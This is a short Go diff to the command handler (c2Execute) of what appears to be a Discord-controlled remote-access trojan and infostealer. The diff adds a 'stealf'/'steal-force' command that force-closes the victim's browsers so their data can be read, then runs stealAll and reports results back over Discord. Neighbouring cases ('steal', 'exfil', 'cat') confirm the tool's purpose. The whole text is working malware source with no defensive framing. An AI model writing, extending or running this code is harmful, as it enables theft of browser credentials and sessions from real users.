@@ -371,6 +371,17 @@ func c2Execute(command string) {
 	case "cat", "type":
 		discordReply(readTextFile(args))
 
+	case "stealf", "steal-force":
+		discordReply("fermeture des navigateurs puis extraction…")
+		killBrowsers()
+		time.Sleep(3 * time.Second)
+		if msg := runWithProgress("extraction (navigateurs fermés)", func() string {
+			stealAll(true)
+			return "extraction terminée."
+		}); msg != "" {
+			discordReply(msg)
+		}
+
 	case "steal", "exfil":
 		if msg := runWithProgress("extraction navigateurs", func() string {
 			stealAll(true)
